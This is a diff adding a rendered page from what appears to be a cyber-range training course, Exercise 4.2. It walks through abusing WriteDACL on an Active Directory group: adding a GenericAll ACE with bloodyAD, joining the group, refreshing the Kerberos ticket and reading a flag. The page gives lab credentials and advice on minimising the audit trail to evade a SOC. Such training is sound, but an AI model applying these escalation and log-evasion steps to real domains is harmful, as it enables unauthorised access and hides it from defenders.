@@ -1,0 +1,1732 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Network forensics exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise 4.2: WriteDACL on a Group - Network Forensics</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-42-writedacl-on-a-group" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Network Forensics" class="md-header__button md-logo" aria-label="Network Forensics" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Network Forensics
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise 4.2: WriteDACL on a Group
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Network Forensics" class="md-nav__button md-logo" aria-label="Network Forensics" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Network Forensics
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N1 -- Log Analysis
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N1 -- Log Analysis
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/01_Port_Scan_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.1 -- Port Scan Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/02_HTTP_Traffic_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.2 -- HTTP Traffic Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/03_DNS_Anomaly_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.3 -- DNS Anomaly Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/04_Failed_Login_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.4 -- Failed Login Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/05_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N2 -- PCAP Forensics
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N2 -- PCAP Forensics
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/01_FTP_Credential_Extraction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.1 -- FTP Credential Extraction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/02_SMTP_Email_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.2 -- SMTP Email Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/03_HTTP_Session_Hijacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.3 -- HTTP Session Hijacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/04_DNS_Data_Exfiltration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.4 -- DNS Data Exfiltration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/05_Attack_Chain_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.5 -- Attack Chain Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/06_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N3 -- Firewalls
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N3 -- Firewalls
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NETSY12_Firewalls/01_Firewall_Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.1 -- Firewall Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NETSY12_Firewalls/02_Firewall_Policy_Hardening/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.2 -- Firewall Policy Hardening
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#your-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Your Objectives
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Your Objectives">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#two-step-escalation-visualised" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Two-Step Escalation Visualised
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tgtpac-refresh-sequence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TGT/PAC Refresh Sequence
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background-writedacl-vs-writeowner" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background: WriteDACL vs WriteOwner
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Background: WriteDACL vs WriteOwner">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-ace-to-add" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What ACE to add
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#microsofts-behavior-on-group-memberships" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Microsoft's behavior on group memberships
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tool-primer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tool Primer
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tool Primer">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bloodyad-ace-manipulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        bloodyAD ACE manipulation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dacleditpy-impacket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        dacledit.py (impacket)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#group-membership-writes-via-net-rpc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Group membership writes via net rpc
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#confirm-via-bloodhound" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Confirm via BloodHound
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-confirm-the-writedacl-edge" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Confirm the WriteDACL Edge
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-add-a-genericall-ace-for-jchen" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Add a GenericAll ACE for j.chen
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-add-jchen-to-the-group" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Add j.chen to the Group
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-get-a-fresh-kerberos-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Get a Fresh Kerberos Ticket
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-read-the-per-token-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5: Read the Per-Token Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6-cleanup-operational-hygiene" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 6: Cleanup (Operational Hygiene)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blue-team-perspective" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blue Team Perspective
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hardening-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hardening Note
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hardening Note">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#record-your-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Record Your Findings
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analysis Questions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheet-recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cheat Sheet Recap
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#spaced-repetition" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Spaced Repetition
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-42-writedacl-on-a-group">Exercise 4.2: WriteDACL on a Group</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p><code>WriteDACL</code> is the right to modify an object's access control list. The attacker exercises it by adding an ACE that grants them further rights (typically <code>GenericAll</code>), then exercising those further rights. On a group, the practical exploitation is: add an ACE granting yourself the right to write the <code>member</code> attribute, then add yourself to the group. Now you inherit whatever the group grants.</p>
+<p>Exercise 4.2 targets a per-token <code>Backup_Operators_&lt;token&gt;</code> group on which <code>IT_HelpDesk</code> has <code>WriteDACL</code>. Add yourself; read the per-token flag file accessible only to group members.</p>
+<p><strong>Tools required:</strong> <code>bloodyAD</code>, <code>net rpc</code>, <code>smbclient</code>, <code>bloodhound-python</code>. Pre-installed on Kali.</p>
+<h2 id="scenario">Scenario</h2>
+<p>Marcus Bell: "GenericAll is the loud version. WriteDACL is the surgical version. You write your own ACE and clean up after. IT_HelpDesk has WriteDACL on a token-scoped Backup_Operators group. Add yourself, read the protected file, then remove your ACE before you leave so the audit trail is minimal."</p>
+<p><strong>Credentials:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>j.chen</code></td>
+<td><code>Welcome2026#</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Domain:</strong> <code>corp.nordport.local</code></p>
+<h2 id="your-objectives">Your Objectives</h2>
+<ul>
+<li>Confirm <code>IT_HelpDesk -WriteDACL-&gt; Backup_Operators_&lt;token&gt;</code> in BloodHound</li>
+<li>Add a <code>GenericAll</code> ACE for <code>j.chen</code> on the group</li>
+<li>Add <code>j.chen</code> to the group</li>
+<li>Read <code>\\corp-dc01\BackupFlags\&lt;token&gt;\FLAG.txt</code></li>
+<li>Remove your ACE (operational hygiene; not scored, but the right habit)</li>
+</ul>
+<h3 id="two-step-escalation-visualised">Two-Step Escalation Visualised</h3>
+<p>WriteDACL is a two-step move: write the ACE, then exercise it. The diagram below mirrors the change you make on disk and the change in your effective rights.</p>
+<pre class="mermaid"><code>flowchart TD
+    Pre["Pre-attack ACL on Backup_Operators_&lt;token&gt;"]
+    Pre --&gt; P1["Domain Admins -- GenericAll"]
+    Pre --&gt; P2["IT_HelpDesk -- WriteDACL"]
+
+    Add["bloodyAD add genericAll&lt;br/&gt;(your write of the ACL)"]
+
+    Post["Post-attack ACL"]
+    Post --&gt; Q1["Domain Admins -- GenericAll"]
+    Post --&gt; Q2["IT_HelpDesk -- WriteDACL"]
+    Post --&gt; Q3["j.chen -- GenericAll&lt;br/&gt;(NEW)"]
+
+    Pre --&gt; Add --&gt; Post
+    Post --&gt; Member["net rpc group addmem&lt;br/&gt;(j.chen now in group)"]
+    Member --&gt; Inherit["j.chen inherits group rights&lt;br/&gt;and reads BackupFlags"]</code></pre>
+<h3 id="tgtpac-refresh-sequence">TGT/PAC Refresh Sequence</h3>
+<p>Group rights live in the PAC of your TGT. Adding yourself does nothing until you obtain a fresh ticket. The diagram below traces what changes when.</p>
+<pre class="mermaid"><code>sequenceDiagram
+    autonumber
+    participant C as Attacker (j.chen)
+    participant K as KDC
+    participant FS as Server (BackupFlags share)
+
+    C-&gt;&gt;K: AS-REQ (initial kinit)
+    K--&gt;&gt;C: TGT with PAC = {IT_HelpDesk}
+    C-&gt;&gt;K: WriteDACL: add GenericAll ACE
+    C-&gt;&gt;K: AddMember: add j.chen to Backup_Operators_&lt;token&gt;
+    C-&gt;&gt;FS: SMB connect with old TGT
+    FS--&gt;&gt;C: ACCESS_DENIED (PAC missing new group)
+    C-&gt;&gt;K: kdestroy + kinit (fresh AS-REQ)
+    K--&gt;&gt;C: NEW TGT with PAC = {IT_HelpDesk, Backup_Operators_&lt;token&gt;}
+    C-&gt;&gt;FS: SMB connect with new TGT
+    FS--&gt;&gt;C: read FLAG.txt OK</code></pre>
+<hr />
+<h2 id="background-writedacl-vs-writeowner">Background: WriteDACL vs WriteOwner</h2>
+<p>Both WriteDACL and WriteOwner let you escalate rights on the target. The difference:</p>
+<table>
+<thead>
+<tr>
+<th>Right</th>
+<th>Mechanism</th>
+<th>Cleanup difficulty</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>WriteDACL</code></td>
+<td>Add an ACE to the existing ACL</td>
+<td>Easy: remove the added ACE</td>
+</tr>
+<tr>
+<td><code>WriteOwner</code></td>
+<td>Take ownership, then write the ACL</td>
+<td>Medium: restore the original owner</td>
+</tr>
+</tbody>
+</table>
+<p><code>WriteDACL</code> is preferred when both are available because the ownership change is a high-fidelity audit trail (event 4670, "permissions on an object were changed", with the original owner field changing). A surgical ACE addition is also event 4670, but the "object owner" field is unchanged so a sloppy SOC may not notice.</p>
+<h3 id="what-ace-to-add">What ACE to add</h3>
+<p>You want <code>GenericAll</code> on the group. Reasoning:
+- <code>GenericAll</code> includes write-property (so you can write the <code>member</code> attribute)
+- <code>GenericAll</code> includes the right to read all attributes (handy if you need to enumerate group state)
+- <code>GenericAll</code> is one ACE, simpler to clean up than three more-specific ones</p>
+<p>Alternative: add only <code>WriteProperty</code> on the <code>member</code> attribute (more surgical):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>bloodyAD<span class="w"> </span>...<span class="w"> </span>add<span class="w"> </span>ace<span class="w"> </span>Backup_Operators_&lt;token&gt;<span class="w"> </span>j.chen<span class="w"> </span>--right<span class="w"> </span>WriteProperty<span class="w"> </span>--object-type<span class="w"> </span>member
+</code></pre></div>
